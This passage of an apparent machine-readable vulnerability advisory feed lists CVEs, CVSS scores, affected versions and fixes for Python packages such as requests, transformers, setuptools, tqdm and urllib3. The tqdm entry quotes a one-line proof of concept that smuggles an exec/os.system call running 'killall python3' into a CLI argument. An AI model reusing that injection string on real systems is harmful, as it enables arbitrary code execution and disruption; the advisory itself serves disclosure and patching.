of changes to the value of `verify`. This behavior will continue for the lifecycle of the connection in the connection pool.  ### Remediation Any of these options can be used to remediate the current issue, we highly recommend upgrading as the preferred mitigation.  * Upgrade to `requests>=2.32.0`. * For `requests<2.32.0`, avoid setting `verify=False` for the first request to a host while using a Requests Session. * For `requests<2.32.0`, call `close()` on `Session` objects to clear existing connections if `verify=False` is used.  ### Related Links * https://github.com/psf/requests/pull/6655"}],"product_status":{"known_affected":["requests@vers:pypi/>=0.0.0|<2.32.0"],"known_not_affected":["requests@2.32.0"]},"references":[{"summary":"GitHub Advisory GHSA-9wx4-h78v-vm56","url":"https://github.com/psf/requests/security/advisories/GHSA-9wx4-h78v-vm56"},{"summary":"Fedora Project Mailing List Announcement","url":"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/IYLSNK5TL46Q6XPRVMHVWS63MVJQOK4Q"},{"summary":"Fedora Project Mailing List Announcement","url":"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/N7WP6EYDSUOCOJYHDK5NX43PYZ4SNHGZ"},{"summary":"Cve 2024","url":"https://nvd.nist.gov/vuln/detail/CVE-2024-35195"},{"summary":"CVE Record","url":"https://nvd.nist.gov/vuln/detail/CVE-2024-35195"}],"scores":[{"cvss_v3":{"attackComplexity":"HIGH","attackVector":"LOCAL","availabilityImpact":"NONE","baseScore":5.6,"baseSeverity":"MEDIUM","confidentialityImpact":"HIGH","environmentalScore":5.6,"environmentalSeverity":"MEDIUM","integrityImpact":"HIGH","modifiedAttackComplexity":"HIGH","modifiedAttackVector":"LOCAL","modifiedAvailabilityImpact":"NONE","modifiedConfidentialityImpact":"HIGH","modifiedIntegrityImpact":"HIGH","modifiedPrivilegesRequired":"HIGH","modifiedScope":"UNCHANGED","modifiedUserInteraction":"REQUIRED","privilegesRequired":"HIGH","scope":"UNCHANGED","temporalScore":5.6,"temporalSeverity":"MEDIUM","userInteraction":"REQUIRED","vectorString":"CVSS:3.1/AV:L/AC:H/PR:H/UI:R/S:U/C:H/I:H/A:N","version":"3.1"},"products":["requests@vers:pypi/>=0.0.0|<2.32.0"]}],"title":"CVE-2024-35195/pkg:pypi/requests@2.31.0"},{"acknowledgements":[{"organization":"NVD","urls":["https://nvd.nist.gov/vuln/detail/CVE-2024-5206"]}],"cve":"CVE-2024-5206","cwe":{"id":"921","name":"Storage of Sensitive Data in a Mechanism without Access Control"},"discovery_date":"2024-06-06T21:30:37","ids":[{"system_name":"Huntr Advisory","text":"14bc0917-a85b-4106-a170-d09d5191517c"},{"system_name":"CVE Record","text":"CVE-2024-5206"}],"notes":[{"category":"description","details":"Vulnerability Description","text":"scikit-learn sensitive data leakage vulnerability"},{"category":"details","details":"Vulnerability Details","text":"# scikit-learn sensitive data leakage vulnerability A sensitive data leakage vulnerability was identified in scikit-learn's TfidfVectorizer, specifically in versions up to and including 1.4.1.post1, which was fixed in version 1.5.0. The vulnerability arises from the unexpected storage of all tokens present in the training data within the `stop_words_` attribute, rather than only storing the subset of tokens required for the TF-IDF technique to function. This behavior leads to the potential leakage of sensitive information, as the `stop_words_` attribute could contain tokens that were meant to be discarded and not stored, such as passwords or keys. The impact of this vulnerability varies based on the nature of the data being processed by the vectorizer."}],"product_status":{"known_affected":["scikit-learn@vers:pypi/>=0.10|<=1.5.0rc1"]},"references":[{"summary":"Huntr Advisory 14bc0917-a85b-4106-a170-d09d5191517c","url":"https://huntr.com/bounties/14bc0917-a85b-4106-a170-d09d5191517c"},{"summary":"CVE Record","url":"https://nvd.nist.gov/vuln/detail/CVE-2024-5206"},{"summary":"Cve 2024","url":"https://nvd.nist.gov/vuln/detail/CVE-2024-5206"}],"scores":[{"cvss_v3":{"attackComplexity":"HIGH","attackVector":"NETWORK","availabilityImpact":"NONE","baseScore":5.3,"baseSeverity":"MEDIUM","confidentialityImpact":"HIGH","environmentalScore":5.3,"environmentalSeverity":"MEDIUM","integrityImpact":"NONE","modifiedAttackComplexity":"HIGH","modifiedAttackVector":"NETWORK","modifiedAvailabilityImpact":"NONE","modifiedConfidentialityImpact":"HIGH","modifiedIntegrityImpact":"NONE","modifiedPrivilegesRequired":"LOW","modifiedScope":"UNCHANGED","modifiedUserInteraction":"NONE","privilegesRequired":"LOW","scope":"UNCHANGED","temporalScore":5.3,"temporalSeverity":"MEDIUM","userInteraction":"NONE","vectorString":"CVSS:3.0/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:N/A:N","version":"3.0"},"products":["scikit-learn@vers:pypi/>=0.10|<=1.5.0rc1"]}],"title":"CVE-2024-5206/pkg:pypi/scikit-learn@1.1.3"},{"acknowledgements":[{"organization":"NVD","urls":["https://nvd.nist.gov/vuln/detail/CVE-2024-40647"]}],"cve":"CVE-2024-40647","cwe":{"id":"200","name":"Exposure of Sensitive Information to an Unauthorized Actor"},"discovery_date":"2024-07-18T17:18:46","ids":[{"system_name":"CVE Record","text":"CVE-2024-40647"},{"system_name":"GitHub Advisory","text":"GHSA-g92j-qhmh-64v2"},{"system_name":"Python Advisory","text":"subprocess"}],"notes":[{"category":"description","details":"Vulnerability Description","text":"Sentry's Python SDK unintentionally exposes environment variables to subprocesses"},{"category":"details","details":"Vulnerability Details","text":"# Sentry's Python SDK unintentionally exposes environment variables to subprocesses ### Impact  The bug in Sentry's Python SDK <2.8.0 results in the unintentional exposure of environment variables to subprocesses despite the `env={}` setting.  ### Details  In Python's `subprocess` calls, all environment variables are passed to subprocesses by default. However, if you specifically do not want them to be passed to subprocesses, you may use `env` argument in `subprocess` calls, like in this example:  ``` >>> subprocess.check_output([\"env\"], env={\"TEST\":\"1\"}) b'TEST=1 ' ```  If you'd want to not pass any variables, you can set an empty dict:  ``` >>> subprocess.check_output([\"env\"], env={}) b'' ```  However, the bug in Sentry SDK <2.8.0 causes **all environment variables** to be passed to the subprocesses when `env={}` is set, unless the Sentry SDK's [Stdlib](https://docs.sentry.io/platforms/python/integrations/default-integrations/#stdlib) integration is disabled. The Stdlib integration is enabled by default.  ### Patches The issue has been patched in https://github.com/getsentry/sentry-python/pull/3251 and the fix released in [sentry-sdk==2.8.0](https://github.com/getsentry/sentry-python/releases/tag/2.8.0). The fix was also backported to [sentry-sdk==1.45.1](https://github.com/getsentry/sentry-python/releases/tag/1.45.1).  ### Workarounds  We strongly recommend upgrading to the latest SDK version. However, if it's not possible, and if passing environment variables to child processes poses a security risk for you, there are two options:  1. In your application, replace `env={}` with the minimal dict `env={\"EMPTY_ENV\":\"1\"}` or similar.  OR  2. Disable Stdlib integration: ``` import sentry_sdk  # Should go before sentry_sdk.init sentry_sdk.integrations._DEFAULT_INTEGRATIONS.remove(\"sentry_sdk.integrations.stdlib.StdlibIntegration\")  sentry_sdk.init(...) ```  ### References * Sentry docs: [Default integrations](https://docs.sentry.io/platforms/python/integrations/default-integrations/) * Python docs: [subprocess module](https://docs.python.org/3/library/subprocess.html) * Patch https://github.com/getsentry/sentry-python/pull/3251"}],"product_status":{"known_affected":["sentry-sdk@vers:pypi/>=0.1.0|<=2.7.1"]},"references":[{"summary":"Python Advisory subprocess","url":"https://docs.python.org/3/library/subprocess.html"},{"summary":"GitHub Advisory GHSA-g92j-qhmh-64v2","url":"https://github.com/getsentry/sentry-python/security/advisories/GHSA-g92j-qhmh-64v2"},{"summary":"Cve 2024","url":"https://nvd.nist.gov/vuln/detail/CVE-2024-40647"},{"summary":"CVE Record","url":"https://nvd.nist.gov/vuln/detail/CVE-2024-40647"}],"scores":[{"cvss_v3":{"attackComplexity":"HIGH","attackVector":"LOCAL","availabilityImpact":"NONE","baseScore":2.5,"baseSeverity":"LOW","confidentialityImpact":"LOW","environmentalScore":2.5,"environmentalSeverity":"LOW","integrityImpact":"NONE","modifiedAttackComplexity":"HIGH","modifiedAttackVector":"LOCAL","modifiedAvailabilityImpact":"NONE","modifiedConfidentialityImpact":"LOW","modifiedIntegrityImpact":"NONE","modifiedPrivilegesRequired":"HIGH","modifiedScope":"CHANGED","modifiedUserInteraction":"NONE","privilegesRequired":"HIGH","scope":"CHANGED","temporalScore":2.5,"temporalSeverity":"LOW","userInteraction":"NONE","vectorString":"CVSS:3.1/AV:L/AC:H/PR:H/UI:N/S:C/C:L/I:N/A:N","version":"3.1"},"products":["sentry-sdk@vers:pypi/>=0.1.0|<=2.7.1"]}],"title":"CVE-2024-40647/pkg:pypi/sentry-sdk@1.14.0"},{"acknowledgements":[{"organization":"NVD","urls":["https://nvd.nist.gov/vuln/detail/CVE-2024-6345"]}],"cve":"CVE-2024-6345","cwe":{"id":"94","name":"Improper Control of Generation of Code"},"discovery_date":"2024-07-15T03:30:57","ids":[{"system_name":"CVE Record","text":"CVE-2024-6345"},{"system_name":"Huntr Advisory","text":"d6362117-ad57-4e83-951f-b8141c6e7ca5"}],"notes":[{"category":"description","details":"Vulnerability Description","text":"setuptools vulnerable to Command Injection via package URL"},{"category":"details","details":"Vulnerability Details","text":"# setuptools vulnerable to Command Injection via package URL A vulnerability in the `package_index` module of pypa/setuptools versions up to 69.1.1 allows for remote code execution via its download functions. These functions, which are used to download packages from URLs provided by users or retrieved from package index servers, are susceptible to code injection. If these functions are exposed to user-controlled inputs, such as package URLs, they can execute arbitrary commands on the system. The issue is fixed in version 70.0.  ## Related CVE(s) BIT-setuptools-2024-6345, CVE-2024-6345"}],"product_status":{"known_affected":["setuptools@vers:pypi/>=0.0.0|<70.0.0"],"known_not_affected":["setuptools@70.0.0"]},"references":[{"summary":"Huntr Advisory d6362117-ad57-4e83-951f-b8141c6e7ca5","url":"https://huntr.com/bounties/d6362117-ad57-4e83-951f-b8141c6e7ca5"},{"summary":"CVE Record","url":"https://nvd.nist.gov/vuln/detail/CVE-2024-6345"},{"summary":"Cve 2024","url":"https://nvd.nist.gov/vuln/detail/CVE-2024-6345"}],"scores":[{"cvss_v3":{"attackComplexity":"LOW","attackVector":"NETWORK","availabilityImpact":"HIGH","baseScore":8.8,"baseSeverity":"HIGH","confidentialityImpact":"HIGH","environmentalScore":8.8,"environmentalSeverity":"HIGH","integrityImpact":"HIGH","modifiedAttackComplexity":"LOW","modifiedAttackVector":"NETWORK","modifiedAvailabilityImpact":"HIGH","modifiedConfidentialityImpact":"HIGH","modifiedIntegrityImpact":"HIGH","modifiedPrivilegesRequired":"NONE","modifiedScope":"UNCHANGED","modifiedUserInteraction":"REQUIRED","privilegesRequired":"NONE","scope":"UNCHANGED","temporalScore":8.8,"temporalSeverity":"HIGH","userInteraction":"REQUIRED","vectorString":"CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H","version":"3.1"},"products":["setuptools@vers:pypi/>=0.0.0|<70.0.0"]}],"title":"CVE-2024-6345/pkg:pypi/setuptools@68.0.0"},{"acknowledgements":[{"organization":"NVD","urls":["https://nvd.nist.gov/vuln/detail/CVE-2023-33976"]}],"cve":"CVE-2023-33976","cwe":{"id":"190","name":"Integer Overflow or Wraparound"},"discovery_date":"2024-07-30T20:47:04","ids":[{"system_name":"CVE Record","text":"CVE-2023-33976"},{"system_name":"GitHub Advisory","text":"GHSA-gjh7-xx4r-x345"}],"notes":[{"category":"description","details":"Vulnerability Description","text":"TensorFlow has segfault in array_ops.upper_bound"},{"category":"details","details":"Vulnerability Details","text":"# TensorFlow has segfault in array_ops.upper_bound ### Impact `array_ops.upper_bound` causes a segfault when not given a rank 2 tensor.  ### Patches We have patched the issue in GitHub commit [915884fdf5df34aaedd00fc6ace33a2cfdefa586](https://github.com/tensorflow/tensorflow/commit/915884fdf5df34aaedd00fc6ace33a2cfdefa586).  The fix will be included in TensorFlow 2.13. We will also cherrypick this commit in TensorFlow 2.12.1.   ### For more information Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.   ### Attribution This vulnerability has been reported by dmc1778  ## Related CVE(s) BIT-tensorflow-2023-33976, CVE-2023-33976"}],"product_status":{"known_affected":["tensorflow@vers:pypi/>=0.0.0|<2.12.1"],"known_not_affected":["tensorflow@2.12.1"]},"references":[{"summary":"GitHub Advisory GHSA-gjh7-xx4r-x345","url":"https://github.com/tensorflow/tensorflow/security/advisories/GHSA-gjh7-xx4r-x345"},{"summary":"Cve 2023","url":"https://nvd.nist.gov/vuln/detail/CVE-2023-33976"},{"summary":"CVE Record","url":"https://nvd.nist.gov/vuln/detail/CVE-2023-33976"}],"scores":[{"cvss_v3":{"attackComplexity":"LOW","attackVector":"NETWORK","availabilityImpact":"HIGH","baseScore":7.5,"baseSeverity":"HIGH","confidentialityImpact":"NONE","environmentalScore":7.5,"environmentalSeverity":"HIGH","integrityImpact":"NONE","modifiedAttackComplexity":"LOW","modifiedAttackVector":"NETWORK","modifiedAvailabilityImpact":"HIGH","modifiedConfidentialityImpact":"NONE","modifiedIntegrityImpact":"NONE","modifiedPrivilegesRequired":"NONE","modifiedScope":"UNCHANGED","modifiedUserInteraction":"NONE","privilegesRequired":"NONE","scope":"UNCHANGED","temporalScore":7.5,"temporalSeverity":"HIGH","userInteraction":"NONE","vectorString":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H","version":"3.1"},"products":["tensorflow@vers:pypi/>=0.0.0|<2.12.1"]}],"title":"CVE-2023-33976/pkg:pypi/tensorflow@2.12.0"},{"acknowledgements":[{"organization":"NVD","urls":["https://nvd.nist.gov/vuln/detail/CVE-2023-27506"]}],"cve":"CVE-2023-27506","cwe":{"id":"119","name":"Improper Restriction of Operations within the Bounds of a Memory Buffer"},"discovery_date":"2023-08-11T03:30:21","ids":[{"system_name":"CVE Record","text":"CVE-2023-27506"},{"system_name":"Intel Advisory","text":"intel-sa-00840"}],"notes":[{"category":"description","details":"Vulnerability Description","text":"Authenticated Local Privilege Escalation vulnerability in Intel Optimization for Tensorflow"},{"category":"details","details":"Vulnerability Details","text":"# Authenticated Local Privilege Escalation vulnerability in Intel Optimization for Tensorflow Improper buffer restrictions in the Intel(R) Optimization for Tensorflow software before version 2.12 may allow an authenticated user to potentially enable escalation of privilege via local access."}],"product_status":{"known_affected":["tensorflow-intel@vers:pypi/>=0.0.1|<=2.12.0rc1"],"known_not_affected":["tensorflow-intel@2.12"]},"references":[{"summary":"Intel Advisory intel-sa-00840","url":"http://www.intel.com/content/www/us/en/security-center/advisory/intel-sa-00840.html"},{"summary":"Cve 2023","url":"https://nvd.nist.gov/vuln/detail/CVE-2023-27506"},{"summary":"CVE Record","url":"https://nvd.nist.gov/vuln/detail/CVE-2023-27506"}],"scores":[{"cvss_v3":{"attackComplexity":"HIGH","attackVector":"LOCAL","availabilityImpact":"LOW","baseScore":5.5,"baseSeverity":"MEDIUM","confidentialityImpact":"LOW","environmentalScore":5.5,"environmentalSeverity":"MEDIUM","integrityImpact":"HIGH","modifiedAttackComplexity":"HIGH","modifiedAttackVector":"LOCAL","modifiedAvailabilityImpact":"LOW","modifiedConfidentialityImpact":"LOW","modifiedIntegrityImpact":"HIGH","modifiedPrivilegesRequired":"LOW","modifiedScope":"UNCHANGED","modifiedUserInteraction":"REQUIRED","privilegesRequired":"LOW","scope":"UNCHANGED","temporalScore":5.5,"temporalSeverity":"MEDIUM","userInteraction":"REQUIRED","vectorString":"CVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:U/C:L/I:H/A:L","version":"3.1"},"products":["tensorflow-intel@vers:pypi/>=0.0.1|<=2.12.0rc1"]}],"title":"CVE-2023-27506/pkg:pypi/tensorflow-intel@2.12.0"},{"acknowledgements":[{"organization":"NVD","urls":["https://nvd.nist.gov/vuln/detail/CVE-2024-34062"]}],"cve":"CVE-2024-34062","cwe":{"id":"74","name":"Improper Neutralization of Special Elements in Output Used by a Downstream Component"},"discovery_date":"2024-05-03T19:33:28","ids":[{"system_name":"CVE Record","text":"CVE-2024-34062"},{"system_name":"GitHub Advisory","text":"GHSA-g7vv-2v7x-gj9p"}],"notes":[{"category":"description","details":"Vulnerability Description","text":"tqdm CLI arguments injection attack"},{"category":"details","details":"Vulnerability Details","text":"# tqdm CLI arguments injection attack ### Impact Any optional non-boolean CLI arguments (e.g. `--delim`, `--buf-size`, `--manpath`) are passed through python's `eval`, allowing arbitrary code execution. Example:  ```sh python -m tqdm --manpath=\"\\\" + str(exec(\\\"import os os.system('echo hi && killall python3')\\\")) + \\\"\" ```  ### Patches https://github.com/tqdm/tqdm/commit/4e613f84ed2ae029559f539464df83fa91feb316 released in `tqdm>=4.66.3`  ### Workarounds None  ### References - https://github.com/tqdm/tqdm/releases/tag/v4.66.3"}],"product_status":{"known_affected":["tqdm@vers:pypi/>=4.4.0|<4.66.3"],"known_not_affected":["tqdm@4.66.3"]},"references":[{"summary":"GitHub Advisory GHSA-g7vv-2v7x-gj9p","url":"https://github.com/tqdm/tqdm/security/advisories/GHSA-g7vv-2v7x-gj9p"},{"summary":"Fedora Project Mailing List Announcement","url":"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/PA3GIGHPWAHCTT4UF57LTPZGWHAX3GW6"},{"summary":"Fedora Project Mailing List Announcement","url":"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/QRECVQCCESHBS3UJOWNXQUIX725TKNY6"},{"summary":"Fedora Project Mailing List Announcement","url":"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/VA337CYUS4SLRFV2P6MX6MZ2LKFURKJC"},{"summary":"Cve 2024","url":"https://nvd.nist.gov/vuln/detail/CVE-2024-34062"},{"summary":"CVE Record","url":"https://nvd.nist.gov/vuln/detail/CVE-2024-34062"}],"scores":[{"cvss_v3":{"attackComplexity":"LOW","attackVector":"LOCAL","availabilityImpact":"NONE","baseScore":3.9,"baseSeverity":"LOW","confidentialityImpact":"LOW","environmentalScore":3.9,"environmentalSeverity":"LOW","integrityImpact":"LOW","modifiedAttackComplexity":"LOW","modifiedAttackVector":"LOCAL","modifiedAvailabilityImpact":"NONE","modifiedConfidentialityImpact":"LOW","modifiedIntegrityImpact":"LOW","modifiedPrivilegesRequired":"LOW","modifiedScope":"UNCHANGED","modifiedUserInteraction":"REQUIRED","privilegesRequired":"LOW","scope":"UNCHANGED","temporalScore":3.9,"temporalSeverity":"LOW","userInteraction":"REQUIRED","vectorString":"CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:U/C:L/I:L/A:N","version":"3.1"},"products":["tqdm@vers:pypi/>=4.4.0|<4.66.3"]}],"title":"CVE-2024-34062/pkg:pypi/tqdm@4.65.0"},{"acknowledgements":[{"organization":"NVD","urls":["https://nvd.nist.gov/vuln/detail/CVE-2023-2800"]}],"cve":"CVE-2023-2800","cwe":{"id":"377","name":"Insecure Temporary File"},"discovery_date":"2023-05-18T18:30:35","ids":[{"system_name":"CVE Record","text":"CVE-2023-2800"}],"notes":[{"category":"description","details":"Vulnerability Description","text":"transformers has Insecure Temporary File"},{"category":"details","details":"Vulnerability Details","text":"# transformers has Insecure Temporary File Insecure Temporary File in GitHub repository huggingface/transformers 4.29.2 and prior. A fix is available at commit 80ca92470938bbcc348e2d9cf4734c7c25cb1c43 and has been released as part of version 4.30.0."}],"product_status":{"known_affected":["transformers@vers:pypi/>=0.0.0|<4.30.0"],"known_not_affected":["transformers@4.30.0"]},"references":[{"summary":"Cve 2023","url":"https://nvd.nist.gov/vuln/detail/CVE-2023-2800"},{"summary":"CVE Record","url":"https://nvd.nist.gov/vuln/detail/CVE-2023-2800"}],"scores":[{"cvss_v3":{"attackComplexity":"HIGH","attackVector":"LOCAL","availabilityImpact":"HIGH","baseScore":4.7,"baseSeverity":"MEDIUM","confidentialityImpact":"NONE","environmentalScore":4.7,"environmentalSeverity":"MEDIUM","integrityImpact":"NONE","modifiedAttackComplexity":"HIGH","modifiedAttackVector":"LOCAL","modifiedAvailabilityImpact":"HIGH","modifiedConfidentialityImpact":"NONE","modifiedIntegrityImpact":"NONE","modifiedPrivilegesRequired":"LOW","modifiedScope":"UNCHANGED","modifiedUserInteraction":"NONE","privilegesRequired":"LOW","scope":"UNCHANGED","temporalScore":4.7,"temporalSeverity":"MEDIUM","userInteraction":"NONE","vectorString":"CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:N/I:N/A:H","version":"3.1"},"products":["transformers@vers:pypi/>=0.0.0|<4.30.0"]}],"title":"CVE-2023-2800/pkg:pypi/transformers@4.26.0"},{"acknowledgements":[{"organization":"NVD","urls":["https://nvd.nist.gov/vuln/detail/CVE-2024-3568"]}],"cve":"CVE-2024-3568","cwe":{"id":"502","name":"Deserialization of Untrusted Data"},"discovery_date":"2024-04-10T18:30:48","ids":[{"system_name":"CVE Record","text":"CVE-2024-3568"},{"system_name":"Huntr Advisory","text":"b3c36992-5264-4d7f-9906-a996efafba8f"}],"notes":[{"category":"description","details":"Vulnerability Description","text":"Transformers Deserialization of Untrusted Data vulnerability"},{"category":"details","details":"Vulnerability Details","text":"# Transformers Deserialization of Untrusted Data vulnerability The huggingface/transformers library is vulnerable to arbitrary code execution through deserialization of untrusted data within the `load_repo_checkpoint()` function of the `TFPreTrainedModel()` class. Attackers can execute arbitrary code and commands by crafting a malicious serialized payload, exploiting the use of `pickle.load()` on data from potentially untrusted sources. This vulnerability allows for remote code execution (RCE) by deceiving victims into loading a seemingly harmless checkpoint during a normal training process, thereby enabling attackers to execute arbitrary code on the targeted machine."}],"product_status":{"known_affected":["transformers@vers:pypi/>=0.0.0|<4.38.0"],"known_not_affected":["transformers@4.38.0"]},"references":[{"summary":"Huntr Advisory b3c36992-5264-4d7f-9906-a996efafba8f","url":"https://huntr.com/bounties/b3c36992-5264-4d7f-9906-a996efafba8f"},{"summary":"Cve 2024","url":"https://nvd.nist.gov/vuln/detail/CVE-2024-3568"},{"summary":"CVE Record","url":"https://nvd.nist.gov/vuln/detail/CVE-2024-3568"}],"scores":[{"cvss_v3":{"attackComplexity":"HIGH","attackVector":"NETWORK","availabilityImpact":"LOW","baseScore":3.4,"baseSeverity":"LOW","confidentialityImpact":"NONE","environmentalScore":3.4,"environmentalSeverity":"LOW","integrityImpact":"NONE","modifiedAttackComplexity":"HIGH","modifiedAttackVector":"NETWORK","modifiedAvailabilityImpact":"LOW","modifiedConfidentialityImpact":"NONE","modifiedIntegrityImpact":"NONE","modifiedPrivilegesRequired":"NONE","modifiedScope":"CHANGED","modifiedUserInteraction":"REQUIRED","privilegesRequired":"NONE","scope":"CHANGED","temporalScore":3.4,"temporalSeverity":"LOW","userInteraction":"REQUIRED","vectorString":"CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:C/C:N/I:N/A:L","version":"3.0"},"products":["transformers@vers:pypi/>=0.0.0|<4.38.0"]}],"title":"CVE-2024-3568/pkg:pypi/transformers@4.26.0"},{"acknowledgements":[{"organization":"NVD","urls":["https://nvd.nist.gov/vuln/detail/CVE-2023-6730"]}],"cve":"CVE-2023-6730","cwe":{"id":"502","name":"Deserialization of Untrusted Data"},"discovery_date":"2023-12-19T15:30:30","ids":[{"system_name":"Huntr Advisory","text":"423611ee-7a2a-442a-babb-3ed2f8385c16"},{"system_name":"CVE Record","text":"CVE-2023-6730"}],"notes":[{"category":"description","details":"Vulnerability Description","text":"transformers has a Deserialization of Untrusted Data vulnerability"},{"category":"details","details":"Vulnerability Details","text":"# transformers has a Deserialization of Untrusted Data vulnerability Deserialization of Untrusted Data in GitHub repository huggingface/transformers prior to 4.36.0."}],"product_status":{"known_affected":["transformers@vers:pypi/>=0.0.0|<4.36.0"],"known_not_affected":["transformers@4.36.0"]},"references":[{"summary":"Huntr Advisory 423611ee-7a2a-442a-babb-3ed2f8385c16","url":"https://huntr.com/bounties/423611ee-7a2a-442a-babb-3ed2f8385c16"},{"summary":"Cve 2023","url":"https://nvd.nist.gov/vuln/detail/CVE-2023-6730"},{"summary":"CVE Record","url":"https://nvd.nist.gov/vuln/detail/CVE-2023-6730"}],"scores":[{"cvss_v3":{"attackComplexity":"LOW","attackVector":"NETWORK","availabilityImpact":"HIGH","baseScore":9.0,"baseSeverity":"CRITICAL","confidentialityImpact":"HIGH","environmentalScore":9.0,"environmentalSeverity":"CRITICAL","integrityImpact":"HIGH","modifiedAttackComplexity":"LOW","modifiedAttackVector":"NETWORK","modifiedAvailabilityImpact":"HIGH","modifiedConfidentialityImpact":"HIGH","modifiedIntegrityImpact":"HIGH","modifiedPrivilegesRequired":"LOW","modifiedScope":"CHANGED","modifiedUserInteraction":"REQUIRED","privilegesRequired":"LOW","scope":"CHANGED","temporalScore":9.0,"temporalSeverity":"CRITICAL","userInteraction":"REQUIRED","vectorString":"CVSS:3.0/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H","version":"3.0"},"products":["transformers@vers:pypi/>=0.0.0|<4.36.0"]}],"title":"CVE-2023-6730/pkg:pypi/transformers@4.26.0"},{"acknowledgements":[{"organization":"NVD","urls":["https://nvd.nist.gov/vuln/detail/CVE-2023-7018"]}],"cve":"CVE-2023-7018","cwe":{"id":"502","name":"Deserialization of Untrusted Data"},"discovery_date":"2023-12-20T18:30:32","ids":[{"system_name":"CVE Record","text":"CVE-2023-7018"},{"system_name":"Huntr Advisory","text":"e1a3e548-e53a-48df-b708-9ee62140963c"}],"notes":[{"category":"description","details":"Vulnerability Description","text":"transformers has a Deserialization of Untrusted Data vulnerability"},{"category":"details","details":"Vulnerability Details","text":"# transformers has a Deserialization of Untrusted Data vulnerability Deserialization of Untrusted Data in GitHub repository huggingface/transformers prior to 4.36."}],"product_status":{"known_affected":["transformers@vers:pypi/>=0.0.0|<4.36.0"],"known_not_affected":["transformers@4.36.0"]},"references":[{"summary":"Huntr Advisory e1a3e548-e53a-48df-b708-9ee62140963c","url":"https://huntr.com/bounties/e1a3e548-e53a-48df-b708-9ee62140963c"},{"summary":"CVE Record","url":"https://nvd.nist.gov/vuln/detail/CVE-2023-7018"},{"summary":"Cve 2023","url":"https://nvd.nist.gov/vuln/detail/CVE-2023-7018"}],"scores":[{"cvss_v3":{"attackComplexity":"LOW","attackVector":"LOCAL","availabilityImpact":"HIGH","baseScore":7.8,"baseSeverity":"HIGH","confidentialityImpact":"HIGH","environmentalScore":7.8,"environmentalSeverity":"HIGH","integrityImpact":"HIGH","modifiedAttackComplexity":"LOW","modifiedAttackVector":"LOCAL","modifiedAvailabilityImpact":"HIGH","modifiedConfidentialityImpact":"HIGH","modifiedIntegrityImpact":"HIGH","modifiedPrivilegesRequired":"NONE","modifiedScope":"UNCHANGED","modifiedUserInteraction":"REQUIRED","privilegesRequired":"NONE","scope":"UNCHANGED","temporalScore":7.8,"temporalSeverity":"HIGH","userInteraction":"REQUIRED","vectorString":"CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H","version":"3.1"},"products":["transformers@vers:pypi/>=0.0.0|<4.36.0"]}],"title":"CVE-2023-7018/pkg:pypi/transformers@4.26.0"},{"acknowledgements":[{"organization":"NVD","urls":["https://nvd.nist.gov/vuln/detail/CVE-2024-37891"]}],"cve":"CVE-2024-37891","cwe":{"id":"669","name":"Incorrect Resource Transfer Between Spheres"},"discovery_date":"2024-06-17T21:37:20","ids":[{"system_name":"CVE Record","text":"CVE-2024-37891"},{"system_name":"GitHub Advisory","text":"GHSA-34jh-p97f-mpxf"}],"notes":[{"category":"description","details":"Vulnerability Description","text":"urllib3's Proxy-Authorization request header isn't stripped during cross-origin redirects "},{"category":"details","details":"Vulnerability Details","text":"# urllib3's Proxy-Authorization request header isn't stripped during cross-origin redirects  When using urllib3's proxy support with `ProxyManager`, the `Proxy-Authorization` header is only sent to the configured proxy, as expected.  However, when sending HTTP requests *without* using urllib3's proxy support, it's possible to accidentally configure the `Proxy-Authorization` header even though it won't have any effect as the request is not using a forwarding proxy or a tunneling proxy. In those cases, urllib3 doesn't treat the `Proxy-Authorization` HTTP header as one carrying authentication material and thus doesn't strip the header on cross-origin redirects.  Because this is a highly unlikely scenario, we believe the severity of this vulnerability is low for almost all users. Out of an abundance of caution urllib3 will automatically strip the `Proxy-Authorization` header during cross-origin redirects to avoid the small chance that users are doing this on accident.  Users should use urllib3's proxy support or disable automatic redirects to achieve safe processing of the `Proxy-Authorization` header, but we still decided to strip the header by default in order to further protect users who aren't using the correct approach.  ## Affected usages  We believe the number of usages affected by this advisory is low. It requires all of the following to be true to be exploited:  * Setting the `Proxy-Authorization` header without using urllib3's built-in proxy support. * Not disabling HTTP redirects. * Either not using an HTTPS origin server or for the proxy or target origin to redirect to a malicious origin.  ## Remediation  * Using the `Proxy-Authorization` header with urllib3's `ProxyManager`. * Disabling HTTP redirects using `redirects=False` when sending requests. * Not using the `Proxy-Authorization` header."}],"product_status":{"known_affected":["urllib3@vers:pypi/>=0.2|<=1.26.18"]},"references":[{"summary":"GitHub Advisory GHSA-34jh-p97f-mpxf","url":"https://github.com/urllib3/urllib3/security/advisories/GHSA-34jh-p97f-mpxf"},{"summary":"CVE Record","url":"https://nvd.nist.gov/vuln/detail/CVE-2024-37891"},{"summary":"Cve 